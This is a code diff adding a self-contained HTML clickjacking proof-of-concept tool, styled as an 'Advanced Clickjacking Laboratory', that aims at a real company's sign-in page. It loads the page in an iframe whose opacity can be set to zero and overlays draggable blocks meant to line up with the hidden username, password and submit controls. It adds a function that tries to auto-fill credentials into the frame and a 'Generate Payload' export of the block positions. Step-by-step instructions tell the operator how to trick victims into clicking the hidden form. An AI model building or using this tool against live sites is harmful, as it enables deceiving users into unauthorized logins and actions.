@@ -1,0 +1,545 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Clickjacking PoC - Advanced (Draggable)</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background: #1a1a2e;
+            color: white;
+            padding: 20px;
+        }
+        
+        .header {
+            text-align: center;
+            padding: 20px;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            border-radius: 10px;
+            margin-bottom: 20px;
+        }
+        
+        .main-container {
+            display: flex;
+            gap: 20px;
+            max-width: 1600px;
+            margin: 0 auto;
+        }
+        
+        .left-panel {
+            flex: 0 0 300px;
+            background: #16213e;
+            padding: 20px;
+            border-radius: 10px;
+            height: fit-content;
+        }
+        
+        .right-panel {
+            flex: 1;
+            background: #16213e;
+            padding: 20px;
+            border-radius: 10px;
+        }
+        
+        .control-section {
+            margin-bottom: 20px;
+            padding: 15px;
+            background: #0f3460;
+            border-radius: 5px;
+        }
+        
+        .control-section h3 {
+            margin-bottom: 10px;
+            color: #ffc107;
+        }
+        
+        .control-group {
+            margin: 10px 0;
+        }
+        
+        label {
+            display: block;
+            margin-bottom: 5px;
+            color: #aaa;
+            font-size: 14px;
+        }
+        
+        input[type="range"] {
+            width: 100%;
+        }
+        
+        input[type="text"], input[type="password"] {
+            width: 100%;
+            padding: 8px;
+            border: 2px solid #667eea;
+            border-radius: 5px;
+            background: #1a1a2e;
+            color: white;
+            font-size: 14px;
+        }
+        
+        button {
+            width: 100%;
+            padding: 10px;
+            background: #667eea;
+            border: none;
+            border-radius: 5px;
+            color: white;
+            cursor: pointer;
+            margin: 5px 0;
+            font-weight: bold;
+            transition: background 0.3s;
+        }
+        
+        button:hover {
+            background: #764ba2;
+        }
+        
+        button.danger {
+            background: #dc3545;
+        }
+        
+        button.danger:hover {
+            background: #c82333;
+        }
+        
+        button.success {
+            background: #28a745;
+        }
+        
+        button.success:hover {
+            background: #218838;
+        }
+        
+        .workspace {
+            position: relative;
+            background: #0f3460;
+            border: 3px solid #667eea;
+            border-radius: 10px;
+            overflow: hidden;
+            min-height: 700px;
+        }
+        
+        iframe {
+            width: 100%;
+            height: 700px;
+            border: none;
+            position: absolute;
+            top: 0;
+            left: 0;
+        }
+        
+        .overlay {
+            position: absolute;
+            width: 100%;
+            height: 100%;
+            top: 0;
+            left: 0;
+            pointer-events: none;
+            z-index: 10;
+        }
+        
+        .draggable {
+            position: absolute;
+            padding: 10px 20px;
+            background: rgba(102, 126, 234, 0.9);
+            border: 2px solid #764ba2;
+            border-radius: 5px;
+            cursor: move;
+            user-select: none;
+            pointer-events: auto;
+            font-weight: bold;
+            box-shadow: 0 5px 15px rgba(0,0,0,0.3);
+        }
+        
+        .draggable:hover {
+            background: rgba(118, 75, 162, 0.9);
+        }
+        
+        .draggable.active {
+            border-color: #ffc107;
+            box-shadow: 0 0 20px rgba(255, 193, 7, 0.5);
+        }
+        
+        #usernameBlock {
+            top: 200px;
+            left: 50px;
+            background: rgba(40, 167, 69, 0.9);
+        }
+        
+        #passwordBlock {
+            top: 250px;
+            left: 50px;
+            background: rgba(220, 53, 69, 0.9);
+        }
+        
+        #submitBlock {
+            top: 300px;
+            left: 50px;
+            background: rgba(255, 193, 7, 0.9);
+            color: #1a1a2e;
+        }
+        
+        .coordinates {
+            position: absolute;
+            bottom: 10px;
+            left: 10px;
+            background: rgba(0,0,0,0.7);
+            padding: 10px;
+            border-radius: 5px;
+            font-family: monospace;
+            font-size: 12px;
+            pointer-events: none;
+            z-index: 100;
+        }
+        
+        .info-box {
+            background: #0f3460;
+            padding: 15px;
+            border-radius: 5px;
+            margin-top: 20px;
+            border-left: 4px solid #ffc107;
+        }
+        
+        .info-box h4 {
+            color: #ffc107;
+            margin-bottom: 10px;
+        }
+        
+        .info-box p {
+            color: #aaa;
+            font-size: 14px;
+            line-height: 1.6;
+        }
+        
+        .value-display {
+            background: #1a1a2e;
+            padding: 5px 10px;
+            border-radius: 3px;
+            display: inline-block;
+            margin-left: 10px;
+            color: #ffc107;
+            font-weight: bold;
+        }
+    </style>
+</head>
+<body>
+    <div class="header">
+        <h1>🎯 Advanced Clickjacking Laboratory</h1>
+        <p>Interactive Drag-and-Drop Exploitation Framework</p>
+    </div>
+    
+    <div class="main-container">
+        <!-- Left Control Panel -->
+        <div class="left-panel">
+            <div class="control-section">
+                <h3>🎛️ Frame Controls</h3>
+                
+                <div class="control-group">
+                    <label>Frame Opacity: <span class="value-display" id="opacityValue">50%</span></label>
+                    <input type="range" id="opacitySlider" min="0" max="100" value="50">
+                </div>
+                
+                <div class="control-group">
+                    <label>Frame Scale: <span class="value-display" id="scaleValue">100%</span></label>
+                    <input type="range" id="scaleSlider" min="50" max="150" value="100">
+                </div>
+                
+                <div class="control-group">
+                    <label>Frame X Position: <span class="value-display" id="frameXValue">0px</span></label>
+                    <input type="range" id="frameX" min="-500" max="500" value="0">
+                </div>
+                
+                <div class="control-group">
+                    <label>Frame Y Position: <span class="value-display" id="frameYValue">0px</span></label>
+                    <input type="range" id="frameY" min="-500" max="500" value="0">
+                </div>
+                
+                <button onclick="resetFrame()">Reset Frame</button>
+                <button onclick="toggleOverlay()" class="success">Toggle Overlay</button>
+            </div>
+            
+            <div class="control-section">
+                <h3>📝 Credentials</h3>
+                
+                <div class="control-group">
+                    <label>Username</label>
+                    <input type="text" id="usernameInput" value="admin" placeholder="Enter username">
+                </div>
+                
+                <div class="control-group">
+                    <label>Password</label>
+                    <input type="password" id="passwordInput" value="password123" placeholder="Enter password">
+                </div>
+                
+                <button onclick="fillCredentials()" class="success">Auto-Fill Credentials</button>
+            </div>
+            
+            <div class="control-section">
+                <h3>📍 Draggable Blocks</h3>
+                
+                <button onclick="resetBlocks()">Reset Positions</button>
+                <button onclick="hideAllBlocks()" class="danger">Hide All Blocks</button>
+                <button onclick="showAllBlocks()" class="success">Show All Blocks</button>
+                <button onclick="generatePayload()">Generate Payload</button>
+            </div>
+            
+            <div class="control-section">
+                <h3>🎯 Target</h3>
+                <p style="color: #aaa; font-size: 12px; word-break: break-all;">https://account.mapbox.com/auth/signin</p>
+                <button onclick="reloadFrame()">Reload Frame</button>
+            </div>
+        </div>
+        
+        <!-- Right Workspace Panel -->
+        <div class="right-panel">
+            <div class="workspace" id="workspace">
+                <iframe id="targetFrame" src="https://account.mapbox.com/auth/signin"></iframe>
+                
+                <div class="overlay" id="overlay">
+                    <div class="draggable" id="usernameBlock">
+                        👤 USERNAME
+                    </div>
+                    <div class="draggable" id="passwordBlock">
+                        🔒 PASSWORD
+                    </div>
+                    <div class="draggable" id="submitBlock">
+                        ✅ SUBMIT
+                    </div>
+                </div>
+                
+                <div class="coordinates" id="coordinates">
+                    Mouse: X: 0, Y: 0<br>
+                    Active: None
+                </div>
+            </div>
+            
+            <div class="info-box">
+                <h4>📚 Instructions</h4>
+                <p>
+                    <strong>1.</strong> Adjust the frame opacity to see the target page below<br>
+                    <strong>2.</strong> Drag the colored blocks to align with the actual login form<br>
+                    <strong>3.</strong> USERNAME block → align with username field<br>
+                    <strong>4.</strong> PASSWORD block → align with password field<br>
+                    <strong>5.</strong> SUBMIT block → align with submit button<br>
+                    <strong>6.</strong> Reduce opacity to 0% to hide the target<br>
+                    <strong>7.</strong> User clicks visible blocks, actually clicks hidden form
+                </p>
+            </div>
+            
+            <div class="info-box">
+                <h4>⚙️ How It Works</h4>
+                <p>
+                    This demonstrates a clickjacking attack where:<br>
+                    • Target website loads in a transparent iframe<br>
+                    • Attacker's interface overlays on top<br>
+                    • Victims think they're interacting with overlay<br>
+                    • They're actually clicking the hidden iframe below<br>
+                    • Can be used to trick users into unauthorized actions
+                </p>
+            </div>
+        </div>
+    </div>
+    
+    <script>
+        // Draggable functionality
+        let activeElement = null;
+        let offset = { x: 0, y: 0 };
+        
+        const draggables = document.querySelectorAll('.draggable');
+        const workspace = document.getElementById('workspace');
+        const coordinates = document.getElementById('coordinates');
+        const overlay = document.getElementById('overlay');
+        const iframe = document.getElementById('targetFrame');
+        
+        // Make elements draggable
+        draggables.forEach(elem => {
+            elem.addEventListener('mousedown', startDrag);
+        });
+        
+        function startDrag(e) {
+            activeElement = e.target;
+            activeElement.classList.add('active');
+            
+            const rect = activeElement.getBoundingClientRect();
+            const workspaceRect = workspace.getBoundingClientRect();
+            
+            offset.x = e.clientX - rect.left;
+            offset.y = e.clientY - rect.top;
+            
+            document.addEventListener('mousemove', drag);
+            document.addEventListener('mouseup', stopDrag);
+            
+            e.preventDefault();
+        }
+        
+        function drag(e) {
+            if (!activeElement) return;
+            
+            const workspaceRect = workspace.getBoundingClientRect();
+            
+            let x = e.clientX - workspaceRect.left - offset.x;
+            let y = e.clientY - workspaceRect.top - offset.y;
+            
+            // Keep within bounds
+            x = Math.max(0, Math.min(x, workspaceRect.width - activeElement.offsetWidth));
+            y = Math.max(0, Math.min(y, workspaceRect.height - activeElement.offsetHeight));
+            
+            activeElement.style.left = x + 'px';
+            activeElement.style.top = y + 'px';
+            
+            updateCoordinates(e, x, y);
+        }
+        
+        function stopDrag() {
+            if (activeElement) {
+                activeElement.classList.remove('active');
+                activeElement = null;
+            }
+            document.removeEventListener('mousemove', drag);
+            document.removeEventListener('mouseup', stopDrag);
+        }
+        
+        function updateCoordinates(e, x, y) {
+            const workspaceRect = workspace.getBoundingClientRect();
+            const mouseX = Math.round(e.clientX - workspaceRect.left);
+            const mouseY = Math.round(e.clientY - workspaceRect.top);
+            
+            coordinates.innerHTML = `
+                Mouse: X: ${mouseX}, Y: ${mouseY}<br>
+                Active: ${activeElement ? activeElement.id : 'None'}<br>
+                Position: X: ${Math.round(x)}, Y: ${Math.round(y)}
+            `;
+        }
+        
+        // Track mouse movement
+        workspace.addEventListener('mousemove', (e) => {
+            if (!activeElement) {
+                const workspaceRect = workspace.getBoundingClientRect();
+                const mouseX = Math.round(e.clientX - workspaceRect.left);
+                const mouseY = Math.round(e.clientY - workspaceRect.top);
+                coordinates.innerHTML = `Mouse: X: ${mouseX}, Y: ${mouseY}<br>Active: None`;
+            }
+        });
+        
+        // Frame controls
+        document.getElementById('opacitySlider').addEventListener('input', function() {
+            iframe.style.opacity = this.value / 100;
+            document.getElementById('opacityValue').textContent = this.value + '%';
+        });
+        
+        document.getElementById('scaleSlider').addEventListener('input', function() {
+            iframe.style.transform = `scale(${this.value / 100})`;
+            iframe.style.transformOrigin = 'top left';
+            document.getElementById('scaleValue').textContent = this.value + '%';
+        });
+        
+        document.getElementById('frameX').addEventListener('input', function() {
+            const y = document.getElementById('frameY').value;
+            iframe.style.transform = `translate(${this.value}px, ${y}px)`;
+            document.getElementById('frameXValue').textContent = this.value + 'px';
+        });
+        
+        document.getElementById('frameY').addEventListener('input', function() {
+            const x = document.getElementById('frameX').value;
+            iframe.style.transform = `translate(${x}px, ${this.value}px)`;
+            document.getElementById('frameYValue').textContent = this.value + 'px';
+        });
+        
+        // Helper functions
+        function resetFrame() {
+            document.getElementById('opacitySlider').value = 50;
+            document.getElementById('scaleSlider').value = 100;
+            document.getElementById('frameX').value = 0;
+            document.getElementById('frameY').value = 0;
+            iframe.style.opacity = 0.5;
+            iframe.style.transform = 'none';
+            document.getElementById('opacityValue').textContent = '50%';
+            document.getElementById('scaleValue').textContent = '100%';
+            document.getElementById('frameXValue').textContent = '0px';
+            document.getElementById('frameYValue').textContent = '0px';
+        }
+        
+        function resetBlocks() {
+            document.getElementById('usernameBlock').style.left = '50px';
+            document.getElementById('usernameBlock').style.top = '200px';
+            document.getElementById('passwordBlock').style.left = '50px';
+            document.getElementById('passwordBlock').style.top = '250px';
+            document.getElementById('submitBlock').style.left = '50px';
+            document.getElementById('submitBlock').style.top = '300px';
+        }
+        
+        function toggleOverlay() {
+            overlay.style.display = overlay.style.display === 'none' ? 'block' : 'none';
+        }
+        
+        function hideAllBlocks() {
+            draggables.forEach(elem => elem.style.display = 'none');
+        }
+        
+        function showAllBlocks() {
+            draggables.forEach(elem => elem.style.display = 'block');
+        }
+        
+        function reloadFrame() {
+            iframe.src = iframe.src;
+        }
+        
+        function fillCredentials() {
+            const username = document.getElementById('usernameInput').value;
+            const password = document.getElementById('passwordInput').value;
+            
+            // This would attempt to fill the iframe form
+            // Note: This might be blocked by same-origin policy
+            try {
+                const iframeDoc = iframe.contentDocument || iframe.contentWindow.document;
+                const usernameField = iframeDoc.querySelector('input[type="text"], input[name*="user"], input[id*="user"]');
+                const passwordField = iframeDoc.querySelector('input[type="password"]');
+                
+                if (usernameField) usernameField.value = username;
+                if (passwordField) passwordField.value = password;
+                
+                alert('Credentials filled successfully!');
+            } catch(e) {
+                alert('Cannot access iframe due to Same-Origin Policy.\nThis is expected for cross-origin iframes.');
+            }
+        }
+        
+        function generatePayload() {
+            const positions = {
+                username: {
+                    x: document.getElementById('usernameBlock').style.left,
+                    y: document.getElementById('usernameBlock').style.top
+                },
+                password: {
+                    x: document.getElementById('passwordBlock').style.left,
+                    y: document.getElementById('passwordBlock').style.top
+                },
+                submit: {
+                    x: document.getElementById('submitBlock').style.left,
+                    y: document.getElementById('submitBlock').style.top
+                }
+            };
+            
+            const payload = `
+// Clickjacking Payload Configuration
+const config = ${JSON.stringify(positions, null, 2)};
+
+// Frame opacity: ${document.getElementById('opacitySlider').value}%
+// Frame scale: ${document.getElementById('scaleSlider').value}%
+// Target URL: https://account.mapbox.com/auth/signin
+            `;
+            
+            console.log(payload);
+            alert('Payload generated! Check browser console (F12)');
+        }
+    </script>
+</body>
+</html>
